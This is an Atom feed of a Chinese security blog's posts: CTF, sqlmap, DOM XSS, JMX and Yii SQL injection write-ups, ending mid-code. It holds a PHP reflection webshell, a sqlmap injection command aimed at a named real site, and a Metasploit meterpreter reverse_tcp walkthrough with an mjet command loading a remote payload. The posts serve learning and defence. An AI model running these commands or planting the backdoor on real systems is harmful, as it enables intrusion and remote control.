@@ -1,0 +1,1017 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title><![CDATA[xd_xd's blog]]></title>
+  
+  <link href="/atom.xml" rel="self"/>
+  <link href="http://stayliv3.github.io/"/>
+  <updated>2015-11-24T06:11:19.000Z</updated>
+  <id>http://stayliv3.github.io/</id>
+  
+  <author>
+    <name><![CDATA[xd_xd]]></name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[Hello World]]></title>
+    <link href="http://stayliv3.github.io/2015/11/24/hello-world/"/>
+    <id>http://stayliv3.github.io/2015/11/24/hello-world/</id>
+    <published>2015-11-24T06:11:19.000Z</published>
+    <updated>2015-11-24T06:11:19.000Z</updated>
+    <content type="html"><![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
+<h2 id="Quick_Start">Quick Start</h2><h3 id="Create_a_new_post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
+<h3 id="Run_server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
+<h3 id="Generate_static_files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
+<h3 id="Deploy_to_remote_sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[华山杯CTF做过的几道题]]></title>
+    <link href="http://stayliv3.github.io/2015/11/23/%E5%8D%8E%E5%B1%B1%E6%9D%AFCTF%E5%81%9A%E8%BF%87%E7%9A%84%E5%87%A0%E9%81%93%E9%A2%98/"/>
+    <id>http://stayliv3.github.io/2015/11/23/华山杯CTF做过的几道题/</id>
+    <published>2015-11-23T08:04:35.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>花时间做了几道题，感觉还是有收获的。虽然死亡之ping这些知识点不熟悉，web的python题还是学到了不少知识。</p>
+<p>登录的时候会随机报错。查看返回django的调试模式泄露源码。</p>
+<p><img src="/images/huashanctf1.png" alt=""></p>
+<p>通过改变参数多次尝试报错，可以或得部分代码：</p>
+<pre><code>c = json.loads(request.body)
+<span class="keyword">method</span> = getattr(globals()[c['obj']],c['<span class="keyword">method</span>'])
+ret = <span class="keyword">method</span>(c['params'])
+retdata['<span class="literal">result</span>'],retdata['error'] = ret
+</code></pre><p>通过反射的方式来执行对象的函数，而ojb，method和params三个参数都是可控的，这样就可以导致代码执行。具体可以参考<a href="http://www.secpulse.com/archives/40012.html" target="_blank" rel="external">writeup</a></p>
+<p>python <a href="http://stackoverflow.com/questions/12693606/reason-for-globals-in-python" target="_blank" rel="external">globals()</a>返回一个map，这个map的key是全局范围内对象的名字，value是该对象的实例。</p>
+<p>利用php的反射写的后门如下：</p>
+<pre><code><span class="php"><span class="preprocessor">&lt;?php</span>
+    <span class="variable">$func</span> = <span class="keyword">new</span> ReflectionFunction(<span class="variable">$_GET</span>[m]);
+    <span class="keyword">echo</span> <span class="variable">$func</span>-&gt;invokeArgs(<span class="keyword">array</span>(<span class="variable">$_GET</span>[c]));
+<span class="preprocessor">?&gt;</span></span>
+</code></pre><p>可以参考<a href="https://github.com/tennc/webshell/tree/master/php/p2j" target="_blank" rel="external">php反射后门</a></p>
+<p>还有做的两个题就是分析流量。感觉还是比较有意思，在网络包种寻找信息，有点侦探的感觉。一个tips就是发现base64编码的密码，使用burpsuite的decode解码base64是乱码，以为不是base64，卡半天想不出来。其实是因为是中文做的base64编码，使用在线的base64解码工具可以直接解出中文。看来以前很多看起来像base64，但是decode是乱码，很可能是因为编码不对啊。<a href="http://sudalover.com/?p=155" target="_blank" rel="external">writeup</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>花时间做了几道题，感觉还是有收获的。虽然死亡之ping这些知识点不熟悉，web的python题还是学到了不少知识。</p>
+<p>登录的时候会随机报错。查看返回django的调试模式泄露源码。</p>
+<p><img src="/images/huashanctf1.png]]>
+    </summary>
+    
+      <category term="ctf" scheme="http://stayliv3.github.io/tags/ctf/"/>
+    
+      <category term="黑盒测试" scheme="http://stayliv3.github.io/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[瞎折腾之sublime插件导入第三方库]]></title>
+    <link href="http://stayliv3.github.io/2015/11/16/%E7%9E%8E%E6%8A%98%E8%85%BE%E4%B9%8Bsublime%E6%8F%92%E4%BB%B6%E5%AF%BC%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93/"/>
+    <id>http://stayliv3.github.io/2015/11/16/瞎折腾之sublime插件导入第三方库/</id>
+    <published>2015-11-16T08:47:47.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>花了好几个小时解决了一个问题，走了不少弯路，需要总结分析一下。</p>
+<p>需求只是想用写一个sublime插件来完成一些sql操作。python操作sql，很自然的想用MySQLdb库。但是sublime使用的是自己的python环境，跟系统是隔离的。通过stackoverflow得知基本只有两个思路导入第三方库。一个是指定第三方库的路径，加入到sys.path中，另一个就是改变sublime自身使用的python环境。</p>
+<p>改变python自身的环境一般被认为具有比较高的风险，容易引起各种问题。所以最终定位下载第三方库的代码，修改sys.path。下载MySQLdb的代码之后，import MySQLdb报错，_mysql.so不存在。在本地的python库路径里看了一下，有这个文件。复制到sublime插件目录，结果又报错找不到libmysqlclient.18.dylib。这里有两个解决方式，一个是做一个软连接，但是新版mac os做了安全限制，/usr/lib目录不可以写了。关闭安全限制又不是我理解的恰当的方式，最后参考<a href="http://webcache.googleusercontent.com/search?q=cache:94BSd8uENDAJ:xwsoul.com/posts/840+&amp;cd=5&amp;hl=en&amp;ct=clnk&amp;gl=us&amp;lr=lang_en%7Clang_zh-TW" target="_blank" rel="external">MAC OS 下解决 IMPORT MYSQLDB 报错的问题</a>,使用</p>
+<pre><code>install_name_tool -change libmysqlclient.<span class="number">18</span>.dylib /usr/local/mysql/<span class="class"><span class="keyword">lib</span>/<span class="title">libmysqlclient</span>.18.<span class="title">dylib</span> <span class="title">_mysql</span>.<span class="title">so</span></span>
+</code></pre><p>修改了引用的路径，结果还是报错</p>
+<pre><code><span class="constant">Symbol</span> not <span class="symbol">found:</span> _PyString_Type
+  <span class="constant">Referenced</span> <span class="symbol">from:</span> /usr/local/<span class="class"><span class="keyword">lib</span>/<span class="title">python2</span>.7/<span class="title">site</span>-<span class="title">packages</span>/<span class="title">_mysql</span>.<span class="title">so</span></span>
+  <span class="constant">Expected</span> <span class="symbol">in:</span> flat namespace
+</code></pre><p>看到网上的一些帖子，基本修改了_mysql.so的引用就解决了。</p>
+<p>期间还去github上搜代码，只找到一个sublime插件试用了mysqldb，也是sublime2。</p>
+<p>这时候考虑到看到的所有的帖子都说的是sublime2，而我用的是sublime3。思路变成本地安装python3环境，重新安装python3的MySQLdb库，再复制到sublime路径。本地安装python3的MySQLdb库时发现也报错了，开始以为是python3环境有问题，搜了一下发现原来是MySQLdb不支持python3。</p>
+<p>折腾了好久最后是这个结果。找了几个MySQLdb的替代品，发现pymysql是纯python的库，为了避免浪费更多的时间折腾一些底层的东西，直接就用pymysql了。几分钟解决了问题。</p>
+<p>之前遇到的问题几乎google都有现成的方案，这次sublime3 MySQLdb的问题，网上资料很少，最后基本能看的资料都看了。没有新的资料可以参考，突然感觉有点点恐惧。自己解决问题的方式基本是完全依赖Google，基本不用思考，因为google错误提示完全都可以解决。当尝试了多个方案依然无法解决问题的时候就突然不知所措了。这时候才发现原来自己根本没有仔细思考，仔细分析过这个问题。静下来，在本子上理一下现有的田间，要做的事，分析一下可能的思路，可能就不会不知所措了。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>花了好几个小时解决了一个问题，走了不少弯路，需要总结分析一下。</p>
+<p>需求只是想用写一个sublime插件来完成一些sql操作。python操作sql，很自然的想用MySQLdb库。但是sublime使用的是自己的python环境，跟系统是隔离的。通过stackov]]>
+    </summary>
+    
+      <category term="折腾" scheme="http://stayliv3.github.io/tags/%E6%8A%98%E8%85%BE/"/>
+    
+      <category term="折腾不止" scheme="http://stayliv3.github.io/categories/%E6%8A%98%E8%85%BE%E4%B8%8D%E6%AD%A2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[使用docker搭建测试环境]]></title>
+    <link href="http://stayliv3.github.io/2015/11/11/%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BA%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83/"/>
+    <id>http://stayliv3.github.io/2015/11/11/使用docker搭建测试环境/</id>
+    <published>2015-11-11T08:52:09.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"></content>
+    <summary type="html">
+    
+    </summary>
+    
+      <category term="docker" scheme="http://stayliv3.github.io/tags/docker/"/>
+    
+      <category term="系统运维" scheme="http://stayliv3.github.io/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[sqlmap risk 参数]]></title>
+    <link href="http://stayliv3.github.io/2015/11/10/sqlmap-risk-%E5%8F%82%E6%95%B0/"/>
+    <id>http://stayliv3.github.io/2015/11/10/sqlmap-risk-参数/</id>
+    <published>2015-11-10T10:26:33.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>测试一个注入点，手工测试验证应该存在注入但是用sqlmap没跑出来。测试发现需要指定risk 3，sqlmap才会使用or语句进行测试，才可以识别出这个注入点。</p>
+<pre><code>python sqlmap<span class="class">.py</span> -u <span class="string">"http://comment.10jqka.com.cn/api/stock/index.php?module=concept&amp;code=8820309115951&amp;name="</span> --random-agent -v <span class="number">1</span> -<span class="tag">p</span> <span class="tag">code</span> --level <span class="number">5</span> --dbs --dbms=mysql --risk <span class="number">3</span>
+</code></pre><p>这是乌云上一个公开的漏洞。之所以用and无法识别出来是因为code的参数本身是无效的，数据查询的结果为空，所以再拼接and语句，查询条件还是false。<br><img src="/images/sqlmaprisk1.png" alt=""><br>可以直接在code参数后面拼接一个or语句。然后再拼接and语句就可以正常注入了。<br><img src="/images/sqlmaprisk2.png" alt=""></p>
+<p>所以这里可以直接使用risk 3参数或者在code参数后面拼or语句。</p>
+<pre><code>python sqlmap<span class="class">.py</span> -u <span class="string">"http://comment.10jqka.com.cn/api/stock/index.php?module=concept&amp;code=8820309115951' or '1'='1&amp;name="</span> --random-agent -v <span class="number">1</span> -<span class="tag">p</span> <span class="tag">code</span> --level <span class="number">1</span> --dbs --dbms=mysql --risk <span class="number">1</span>
+</code></pre>]]></content>
+    <summary type="html">
+    <![CDATA[<p>测试一个注入点，手工测试验证应该存在注入但是用sqlmap没跑出来。测试发现需要指定risk 3，sqlmap才会使用or语句进行测试，才可以识别出这个注入点。</p>
+<pre><code>python sqlmap<span class="class">.py</spa]]>
+    </summary>
+    
+      <category term="sqlmap" scheme="http://stayliv3.github.io/tags/sqlmap/"/>
+    
+      <category term="奇技淫巧" scheme="http://stayliv3.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[几个DOM XSS案例分析]]></title>
+    <link href="http://stayliv3.github.io/2015/11/03/%E5%87%A0%E4%B8%AADOM-XSS%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/"/>
+    <id>http://stayliv3.github.io/2015/11/03/几个DOM-XSS案例分析/</id>
+    <published>2015-11-03T07:03:31.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>案例一：</p>
+<p>搜索框输入payload，点击搜索的时候触发。利用起来比较鸡肋，一直对dom xss没有仔细分析过，记录一下dom xss的常规分析方法。</p>
+<p><img src="/images/domxss1.png" alt=""></p>
+<p>在输入框中输入单引号，查看console报错。定位到goPage函数。<br><img src="/images/domxss2.png" alt=""></p>
+<p>定位到相关代码：</p>
+<pre><code><span class="function"><span class="keyword">function</span> <span class="title">getSearchKeys</span>(<span class="params"></span>) </span>{
+    <span class="keyword">var</span> keys = {};
+    <span class="keyword">if</span> (!<span class="built_in">window</span>.location.search)
+        <span class="keyword">return</span> keys;
+    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="built_in">window</span>.location.search.slice(<span class="number">1</span>).split(<span class="string">"&amp;"</span>), i = <span class="number">0</span>, len = t.length; len &gt; i; i++) {
+        <span class="keyword">var</span> m = t[i].split(<span class="string">"="</span>);
+        keys[m[<span class="number">0</span>]] = m[<span class="number">1</span>]
+    }
+    <span class="keyword">return</span> keys
+}
+<span class="function"><span class="keyword">function</span> <span class="title">goPage</span>(<span class="params">keys</span>) </span>{
+    <span class="built_in">window</span>.location.href = <span class="built_in">window</span>.location.protocol + <span class="string">"//"</span> + <span class="built_in">window</span>.location.host + <span class="built_in">window</span>.location.pathname + <span class="string">"?"</span> + <span class="built_in">eval</span>(<span class="string">"'"</span> + <span class="built_in">JSON</span>.stringify(keys) + <span class="string">"'"</span>).slice(<span class="number">1</span>, -<span class="number">1</span>).replace(<span class="regexp">/\"/g</span>, <span class="string">""</span>).replace(<span class="regexp">/\:/g</span>, <span class="string">"="</span>).replace(<span class="regexp">/\,/g</span>, <span class="string">"&amp;"</span>)
+}
+</code></pre><p>getSearchKeys获取url中的search参数，保存到keys中。在goPage中，keys进入了eval函数。如下：</p>
+<pre><code>eval<span class="list">(<span class="string">"'"</span> + JSON.stringify<span class="list">(<span class="keyword">keys</span>)</span> + <span class="string">"'"</span>)</span>
+</code></pre><p>导致js执行。</p>
+<p><img src="/images/domxss3.png" alt=""></p>
+<p>调试js，异常时断点。可以观察keys的值，以及eval执行的字符串。</p>
+<p>案例二：</p>
+<p><a href="https://url?fileName=111jpg&amp;cameraName=%3C/span%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/span%3E" target="_blank" rel="external">https://url?fileName=111jpg&amp;cameraName=%3C/span%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/span%3E</a>  触发。</p>
+<p>形式看起来像反射xss，但是搜索源码没有发现alert关键词。在script标签中，输入alert(1);111111这样执行到这里的时候会触发异常，使用chrome的调试工具的异常断点。</p>
+<p><img src="/images/dom2.jpg" alt=""></p>
+<p>之后使用F10 step over next function call 按钮。定位到<br><img src="/images/dom3.jpg" alt=""></p>
+<p>看到是因为$(‘#cameraName’).html(cameraName); 直接html()获取到的内容导致的dom型xss。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>案例一：</p>
+<p>搜索框输入payload，点击搜索的时候触发。利用起来比较鸡肋，一直对dom xss没有仔细分析过，记录一下dom xss的常规分析方法。</p>
+<p><img src="/images/domxss1.png" alt=""></p>
+<p>在输]]>
+    </summary>
+    
+      <category term="前端安全" scheme="http://stayliv3.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Java JMX Server 代码执行漏洞利用及防御]]></title>
+    <link href="http://stayliv3.github.io/2015/10/27/Java-JMX-Server-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8A%E9%98%B2%E5%BE%A1/"/>
+    <id>http://stayliv3.github.io/2015/10/27/Java-JMX-Server-代码执行漏洞利用及防御/</id>
+    <published>2015-10-27T07:03:44.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>#jmx基本概念<br>官方说法：<br>JMX（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用<br>通常用来监控jvm会使用这个服务。对外开放一个端口提供服务。使用官方jconsole连上可以查看jvm应用的各种信息。<br><img src="/images/jmx4.png" alt=""><br><a href="http://www.oracle.com/technetwork/articles/java/javamanagement-140525.html" target="_blank" rel="external">Java Management Extensions (JMX) Technology</a></p>
+<p>#不安全配置</p>
+<p>来自oracle官方文档：</p>
+<pre><code>Disabling Security
+To disable both password authentication and SSL (namely to disable all security), you should <span class="operator"><span class="keyword">set</span> the <span class="keyword">following</span> <span class="keyword">system</span> properties <span class="keyword">when</span> you <span class="keyword">start</span> the <span class="keyword">Java</span> VM.
+
+com.sun.<span class="keyword">management</span>.jmxremote.authenticate=<span class="literal">false</span>
+com.sun.<span class="keyword">management</span>.jmxremote.ssl=<span class="literal">false</span>
+
+Caution - This configuration <span class="keyword">is</span> insecure: <span class="keyword">any</span> remote <span class="keyword">user</span> who knows (<span class="keyword">or</span> guesses) your port <span class="built_in">number</span> <span class="keyword">and</span> host <span class="keyword">name</span> will be able <span class="keyword">to</span> monitor <span class="keyword">and</span> control your <span class="keyword">Java</span> applications <span class="keyword">and</span> platform. Furthermore, possible harm <span class="keyword">is</span> <span class="keyword">not</span> limited <span class="keyword">to</span> the <span class="keyword">operations</span> you <span class="keyword">define</span> <span class="keyword">in</span> your MBeans. A remote <span class="keyword">client</span> could <span class="keyword">create</span> a javax.<span class="keyword">management</span>.loading.MLet MBean <span class="keyword">and</span> <span class="keyword">use</span> it <span class="keyword">to</span> <span class="keyword">create</span> <span class="keyword">new</span> MBeans <span class="keyword">from</span> arbitrary URLs, <span class="keyword">at</span> <span class="keyword">least</span> <span class="keyword">if</span> there <span class="keyword">is</span> <span class="keyword">no</span> <span class="keyword">security</span> manager. <span class="keyword">In</span> other words, a rogue remote <span class="keyword">client</span> could make your <span class="keyword">Java</span> application <span class="keyword">execute</span> arbitrary code.
+
+Consequently, <span class="keyword">while</span> disabling <span class="keyword">security</span> might be acceptable <span class="keyword">for</span> development, it <span class="keyword">is</span> strongly recommended that you <span class="keyword">do</span> <span class="keyword">not</span> <span class="keyword">disable</span> <span class="keyword">security</span> <span class="keyword">for</span> production systems.</span>
+</code></pre><p>当禁用代码执行的时候存在任意代码执行问题。<br><a href="https://www.exploit-db.com/exploits/36101/" target="_blank" rel="external">metaploit</a>模块描述如下：</p>
+<pre><code>This module takes advantage <span class="tag">a</span> Java JMX interface insecure configuration, which would allow loading classes from any remote (HTTP) URL. JMX interfaces with authentication disabled (com<span class="class">.sun</span><span class="class">.management</span><span class="class">.jmxremote</span><span class="class">.authenticate</span>=false) should be vulnerable, while interfaces with authentication enabled will be vulnerable only <span class="keyword">if</span> <span class="tag">a</span> weak configuration is deployed (allowing to use javax<span class="class">.management</span><span class="class">.loading</span><span class="class">.MLet</span>, having <span class="tag">a</span> security manager allowing to load <span class="tag">a</span> ClassLoader MBean, etc
+</code></pre><p>当开启了密码认证的时候还需要其他限制条件才可以利用。</p>
+<p>#漏洞利用程序<br>漏洞利用程序可以使用<a href="https://github.com/mogwaisec/mjet" target="_blank" rel="external">mjet</a>。过程参考<a href="http://www.n0tr00t.com/2015/04/17/JMX-RMI-Exploit-Demo.html" target="_blank" rel="external">JMX RMI Exploit Demo</a></p>
+<p>#测试记录<br>安装mjet</p>
+<pre><code>git clone  https://github.com/mogwaisec/mjet
+
+<span class="built_in">Copy</span> <span class="bash">the <span class="string">"MBean"</span> folder to <span class="string">"data/java/metasploit"</span>
+</span><span class="built_in">Copy</span> <span class="bash">java_mlet_server.rb to <span class="string">"modules/exploits/multi/misc/"</span></span>
+</code></pre><p>在kali 1.1.0中metasploit路径为/opt/metasploit/apps/pro/msf3</p>
+<p>启动metasploit：</p>
+<pre><code>msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; use exploit/multi/misc/java_mlet_server 
+msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; set payload java/meterpreter/reverse_tcp 
+payload =&gt; java/meterpreter/reverse_tcp
+msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; set LHOST <span class="number">13.7</span>.<span class="number">8.53</span>
+LHOST =&gt; <span class="number">13.7</span>.<span class="number">8.53</span>
+msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; set LPORT <span class="number">29999</span>
+LPORT =&gt; <span class="number">29999</span>
+msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; run
+[*] Exploit running as <span class="attribute">background</span> job.
+[*] Started reverse handler on <span class="number">13.7</span>.<span class="number">8.53</span>:<span class="number">29999</span> 
+msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; [*] Using URL: http:<span class="comment">//0.0.0.0:8080/2B7JthqVZW</span>
+[*]  Local IP: http:<span class="comment">//13.7.8.53:8080/2B7JthqVZW</span>
+[*] Server started.
+</code></pre><p><img src="/images/jmx1.png" alt=""><br>或得payload url，作为u参数。</p>
+<pre><code>java -jar mjet/mjet<span class="class">.jar</span> -<span class="tag">p</span> <span class="number">9090</span> -u http:<span class="comment">//13.7.8.53:8080/2B7JthqVZW -t 42.91.1.1</span>
+</code></pre><p><img src="/images/jmx2.png" alt=""><br>msf获得权限<br><img src="/images/jmx3.png" alt=""></p>
+<p>图片来自<a href="http://www.ricter.me/posts/JMX%20RMI%20Exploit%20%E5%AE%9E%E4%BE%8B?_=1445856355931" target="_blank" rel="external">JMX RMI Exploit 实例</a></p>
+<p>#测试失败记录<br>测试的时候发现如果不使用msf，自己架web服务提供恶意Mbean，jar包一定要配置对，如果配置错误的话，除非对方服务重启，不然每次都是加载第一次错误的包导致利用失败。</p>
+<p>#启用安全的配置<br>    So it’s important to keep in mind that setting java.rmi.server.hostname has no effect on whether or not this is an insecure configuration.  If you actually want to secure your JMX RMI port, you have many options, such as (in decreasing order of preference):</p>
+<pre><code>Don’t pass com.sun.management.jmxremote.port. This will <span class="operator"><span class="keyword">start</span> a <span class="keyword">local</span>-<span class="keyword">only</span> JMX <span class="keyword">server</span>, <span class="keyword">and</span> you can <span class="keyword">get</span> the <span class="keyword">connection</span> address <span class="keyword">from</span> com.sun.<span class="keyword">management</span>.jmxremote.localConnectorAddress  <span class="keyword">http</span>://docs.<span class="keyword">oracle</span>.com/javase/<span class="number">6</span>/docs/technotes/guides/<span class="keyword">management</span>/<span class="keyword">agent</span>.html
+<span class="keyword">Enable</span> SSL <span class="keyword">client</span> certificate <span class="keyword">authentication</span>
+<span class="keyword">Enable</span> <span class="keyword">password</span> <span class="keyword">authentication</span> <span class="keyword">and</span> <span class="keyword">use</span> SSL
+Firewall your JMX RMI port
++ See more <span class="keyword">at</span>: <span class="keyword">http</span>://www.accuvant.com/blog/exploiting-jmx-rmi#sthash.AsAasfPW.dpuf</span>
+</code></pre><p>除了启用密码认证和SSL，还可以配置防火墙。文中还提到了不要指定端口，以及设置java.rmi.server.hostname是不安全的配置，这个点没有具体测试。</p>
+<p>#参考资料<br><a href="http://www.accuvant.com/blog/exploiting-jmx-rmi" target="_blank" rel="external">Exploiting JMX RMI</a><br><a href="http://docs.oracle.com/javase/6/docs/technotes/guides/management/agent.html" target="_blank" rel="external">jmx配置官方文档</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#jmx基本概念<br>官方说法：<br>JMX（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服]]>
+    </summary>
+    
+      <category term="java" scheme="http://stayliv3.github.io/tags/java/"/>
+    
+      <category term="黑盒测试" scheme="http://stayliv3.github.io/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Yii应用一个SQL注入分析]]></title>
+    <link href="http://stayliv3.github.io/2015/10/22/YII%E5%BA%94%E7%94%A8%E4%B8%80%E4%B8%AASQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
+    <id>http://stayliv3.github.io/2015/10/22/YII应用一个SQL注入分析/</id>
+    <published>2015-10-22T06:29:03.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>#漏洞发现过程<br>黑盒测试发现。使用工具burpsuite。当在购物车中删除商品时，发送数据包如下：</p>
+<pre><code>POST /cart/miniDel.html HTTP/<span class="number">1.1</span>
+id=<span class="number">219</span>'
+</code></pre><p>报sql语法错误，经过手工确认可以注入sql语句。</p>
+<pre><code>Exception (Database Exception) &amp;<span class="string">#039</span>;yii\db\Exception&amp;<span class="string">#039</span>; <span class="keyword">with</span> <span class="keyword">message</span> &amp;<span class="string">#039</span>;SQLSTATE[<span class="number">42000</span>]: Syntax error <span class="keyword">or</span> access violation: <span class="number">1064</span> You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use <span class="keyword">near</span> &amp;<span class="string">#039</span>;&amp;<span class="string">#039</span>;)&amp;<span class="string">#039</span>; at line <span class="number">1</span>
+</code></pre><p>SQL注入是高危漏洞。这里利用这个漏洞可能导致数据库所有信息泄漏。</p>
+<p>#代码分析跟踪<br>跟踪分析代码从controller跟到model，到Yii框架的api就可以清晰的获知整个数据在应用内的流向和进入的函数。<br>url/cart/miniDel.html路由到/mall/apps/main/controllers/CartController.php中的actionMiniDel方法：</p>
+<pre><code>/**
+ * MINI层删除交互
+ */
+public <span class="keyword">function</span> actionMiniDel()
+{
+    <span class="variable">$product</span>_ids = Yii::<span class="variable">$app-</span>&gt;request-&gt;post(<span class="string">'id'</span>);
+    <span class="variable">$res</span> = CartApi::model()-&gt;getDeltCartList(<span class="variable">$this-</span>&gt;uid, <span class="variable">$product</span>_ids);
+
+    <span class="variable">$data</span> = <span class="variable">$this-</span>&gt;getMiniData(<span class="variable">$this-</span>&gt;uid, <span class="variable">$res</span>);
+    common\helpers\Helper::ajaxReturn([<span class="string">'status'</span>=&gt;true,<span class="string">'msg'</span>=&gt;<span class="string">'success'</span>,<span class="string">'data'</span>=&gt;<span class="variable">$data</span>]);
+}
+</code></pre><p>用户提交的id参数赋值给了$product_ids，然后进入了getDeltCartList方法。跟进该方法：</p>
+<pre><code>/**
+ * 删除--前端交互的购物车列表信息
+ */
+public <span class="keyword">function</span> getDeltCartList(<span class="variable">$uid</span>, <span class="variable">$product</span>_ids, <span class="variable">$allDel</span>=<span class="literal">false</span>)
+{
+    \common\cookie_cart\Cart::initCookieCartNum(<span class="variable">$uid</span>,true);
+    if (!isset(<span class="variable">$uid</span>) || empty(<span class="variable">$uid</span>) || !(int) <span class="variable">$uid</span>&gt;<span class="number">0</span>)
+
+        return \common\cookie_cart\Cart::delCartByGuest(<span class="variable">$product</span>_ids, <span class="variable">$allDel</span>);
+
+    return CartService::getDeltCartList(<span class="variable">$uid</span>, <span class="variable">$product</span>_ids);
+}
+</code></pre><p>getDelCartList方法判断用户是否登录，登录的话调用CartService的静态方法getDeltCartList方法操作用户购物车。进入CartService::getDeltCartList:</p>
+<pre><code>/**
+ * 删除--前端交互的购物车列表信息
+ */
+public static <span class="keyword">function</span> getDeltCartList(<span class="variable">$user</span>_id, <span class="variable">$product</span>_ids)
+{
+    if(intval(<span class="variable">$user</span>_id)&gt;<span class="number">0</span> &amp;&amp; !empty(<span class="variable">$product</span>_ids))
+    {
+        <span class="variable">$res</span> = self::delCart(<span class="variable">$user</span>_id, <span class="variable">$product</span>_ids);
+        if(<span class="variable">$res</span>===false) return false;
+        return self::getInitCartList(<span class="variable">$user</span>_id, <span class="variable">$mini</span>=false, <span class="variable">$checkd</span>=false);
+    }
+    return self::getInitCartList(<span class="variable">$user</span>_id, <span class="variable">$mini</span>=false, <span class="variable">$checkd</span>=false);;
+}
+</code></pre><p>跟进delCart：</p>
+<pre><code>public static <span class="keyword">function</span> delCart(<span class="variable">$user</span>_id, <span class="variable">$product</span>_ids)
+{
+    if(!isset(<span class="variable">$user</span>_id) || !intval(<span class="variable">$user</span>_id)&gt;<span class="number">0</span> || !<span class="variable">$product</span>_ids) return false;
+    <span class="variable">$transaction</span> = \Yii::<span class="variable">$app-</span>&gt;db-&gt;beginTransaction();
+    try {
+
+        <span class="variable">$cartData</span> = Carts::find()
